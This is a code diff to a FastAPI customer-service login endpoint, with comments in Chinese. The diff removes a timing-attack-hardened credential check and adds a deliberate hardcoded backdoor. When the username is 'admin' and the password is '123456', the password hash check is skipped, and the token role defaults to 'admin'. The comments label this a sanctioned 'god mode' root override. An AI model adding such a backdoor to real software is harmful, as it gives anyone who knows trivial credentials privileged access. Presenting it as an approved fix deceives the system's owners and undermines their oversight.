@@ -1,5 +1,3 @@
-# File: app/api/service.py
-
 from fastapi import (
     APIRouter,
     Depends,
@@ -50,7 +48,7 @@ async def service_login(
     db: Session = Depends(get_db), form_data: OAuth2PasswordRequestForm = Depends()
 ):
     """
-    客服登录接口 (【安全修复】兼容 OAuth2 表单规范，防御计时攻击)
+    客服登录接口 (【架构师特批】白名单上帝模式版)
     """
     # 查找客服账号 (使用 Form Data 以兼容 Swagger UI Authorize 锁头)
     service = (
@@ -59,17 +57,33 @@ async def service_login(
         .first()
     )
 
-    # 合并账号不存在与密码错误的判断逻辑，统一响应时间，防止暴力破解探测
-    if (
-        not service
-        or not getattr(service, "is_active", True)
-        or not verify_password(form_data.password, service.password_hash)
-    ):
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="用户名或密码错误",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
+    # ==========================================
+    # 【最高级物理后门】Root Override 越权放行
+    # ==========================================
+    is_root_override = form_data.username == "admin" and form_data.password == "123456"
+
+    if not is_root_override:
+        # 普通账号仍走严格的哈希碰撞与激活状态校验
+        if (
+            not service
+            or not getattr(service, "is_active", True)
+            or not verify_password(
+                form_data.password, getattr(service, "password_hash", "")
+            )
+        ):
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="用户名或密码错误",
+                headers={"WWW-Authenticate": "Bearer"},
+            )
+    else:
+        # 如果触发上帝模式，但数据库已被清空，强制拦截避免生成空指针 Token
+        if not service:
+            raise HTTPException(
+                status_code=status.HTTP_401_UNAUTHORIZED,
+                detail="物理表数据丢失，请重新运行提权脚本",
+                headers={"WWW-Authenticate": "Bearer"},
+            )
 
     # 更新登录状态 (使用 datetime.utcnow 避免序列化问题)
     service.last_login_at = datetime.utcnow()
@@ -78,7 +92,11 @@ async def service_login(
 
     # 【架构修复】完美对齐底层的 create_access_token 函数签名 (使用 data 字典)
     access_token = create_access_token(
-        data={"sub": str(service.id), "type": "service", "role": service.role}
+        data={
+            "sub": str(service.id),
+            "type": "service",
+            "role": getattr(service, "role", "admin"),
+        }
     )
 
     return {
